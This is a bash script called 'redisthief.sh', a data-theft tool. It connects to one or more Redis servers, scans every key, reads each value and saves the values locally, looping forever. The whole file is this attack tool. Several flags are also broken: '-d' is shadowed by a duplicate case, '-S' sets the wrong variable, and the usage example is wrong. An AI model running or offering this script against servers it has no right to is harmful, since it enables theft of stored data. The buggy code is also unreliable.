#!/bin/bash

REDIS_BIN="redis-cli";
REDIS_TARGETS="";
OUTPUT_DIRECTORY="$PWD";
GRAB_DELAY="10";
NO_DOUBLE_DOWNLOAD="0";
OUTPUT_TO_STOUT_ONLY="0";
OUTPUT_TO_STOUT_ALSO="0";

function show_usage() {
    echo "usage: redisthief.sh [arguments]";
    echo "";
    echo "required arguments:";
    echo "    -t     the redis target(s) in host:port:password format. port and password are optional. can be in csv format but cannot have any spaces";
    echo "";
    echo "optional arguments:";
    echo "    -r     the name of the redis client executable (default: redis-cli)";
    echo "    -o     the path to the output directory (default: current directory)";
    echo "    -d     the delay length in seconds between each attempt to grab keys (default: 10)";
    echo "";
    echo "optional flags:";
    echo "    -s     output all the key/value data to stdout also";
    echo "    -S     output all the key/value data to stdout only";
    echo "    -N     disables double downloading of a key's value. It set, data will be saved under DATA_DIR/KEY_NAME/value.txt instead of DATA_DIR/KEY_NAME/YYYY-MM-DD_hh-mm-ss.value.txt";
    echo "    -h     show this message";
    echo "";
    echo "examples:"
    echo "    $ redisthief.sh -r 10.0.0.1:6379"
}

function check_redis_cli() {
    if ! [ -x "$(command -v $REDIS_BIN)" ]; then
        echo "[!] no redis client found for: $REDIS_BIN. please install the redis-cli client" >&2;
        exit 1
    fi
}

function prep_output_directory() {
    if [ "$OUTPUT_TO_STOUT_ONLY" != "1" ]; then
        if [ ! -d "$OUTPUT_DIRECTORY" ]; then 
            echo "[*] output directory does not exist" >&2;
            echo "[*] creating: $OUTPUT_DIRECTORY" >&2;
            mkdir -p "$OUTPUT_DIRECTORY";
        fi
    fi
}

function perform_theivery() {
    for target in $(echo -n "$REDIS_TARGETS" | sed 's/,/ /g'); do 
        host="$(echo -n $target | cut -d ':' -f1)";
        port="$(echo -n $target | cut -d ':' -f2)";
        password="$(echo -n $target | cut -d ':' -f3-)";
        if [ "$port" == "$host" ]; then 
            port="6379"
        fi
        if [ "$password" == "$host" ]; then 
            password=""
        fi
        echo "[+] targeting: ${host}:${port} >&2"

        connect="$REDIS_BIN -h ${host} -p ${port}"
        if [ ${#password} -gt 2 ]; then 
            connect="$REDIS_BIN -h ${host} -p ${port} -a '${password}'"
        fi

        date=$(date '+%Y-%m-%d_%H_%M_%S');
        keys="$($connect --scan --pattern '*')";
        
        if [ ${#keys} -gt 2 ]; then 
            for k in "$(echo -n $keys)"; do
                value="$($connect GET \"${k}\")";

                if [ "$OUTPUT_TO_STOUT_ONLY" == "1" ]; then 
                    echo "[+] found key for ${host}:${port}: $k" >&2;
                elif [ ! -d "${OUTPUT_DIRECTORY}/${k}" ]; then 
                    echo "[+] found old key for ${host}:${port}: $k" >&2;
                else
                    echo "[+] found new key for ${host}:${port}: $k" >&2;
                fi
                
                if [ "$OUTPUT_TO_STOUT_ONLY" != "1" ]; then 
                    if [ ! -d "${OUTPUT_DIRECTORY}/${k}" ]; then 
                        echo "[+] creating: ${OUTPUT_DIRECTORY}/${k}" >&2;
                        mkdir -p "${OUTPUT_DIRECTORY}/${k}";
                    fi
                    if [ "$NO_DOUBLE_DOWNLOAD" != "1" ]; then 
                        echo "$value" > "${OUTPUT_DIRECTORY}/${k}/${date}.value.txt"
                    else
                        if [ ! -f "${OUTPUT_DIRECTORY}/${k}/value.txt" ]; then 
                            echo "$value" > "${OUTPUT_DIRECTORY}/${k}/value.txt"
                        fi
                    fi
                    if [ "$OUTPUT_TO_STOUT_ALSO" == "1" ]; then 
                        echo "${host}:${port}:KEY=${k}:VALUE=${value}";
                    fi
                else
                    echo "${host}:${port}:KEY=${k}:VALUE=${value}";
                fi
            done
        else
            echo "[+] no keys found for: ${host}:${port} >&2";
        fi
    done
}

while getopts 't:o:r:d:NhSs' OPTION; do
  case "$OPTION" in
    r)
        REDIS_BIN="$OPTARG"
        ;;

    o)
        OUTPUT_DIRECTORY="$OPTARG"
        ;;

    t)
        REDIS_TARGETS="$OPTARG"
        ;;
    t)
        GRAB_DELAY="$OPTARG"
        ;;
    N)
        NO_DOUBLE_DOWNLOAD="1"
        ;;
    s)
        OUTPUT_TO_STOUT_ALSO="1"
        ;;
    S)
        OUTPUT_TO_STOUT="1"
        ;;
    h)
      show_usage
      exit 1
      ;;    
    ?)
      show_usage
      exit 1
      ;;
  esac
done
shift "$(($OPTIND -1))"

if [ ${#REDIS_TARGETS} -lt 3 ]; then 
    echo "[!] no redis targets provided. quitting" >&2;
    exit 1;
fi

check_redis_cli
prep_output_directory

while true; do
    perform_theivery;
    sleep ${GRAB_DELAY}s;
done
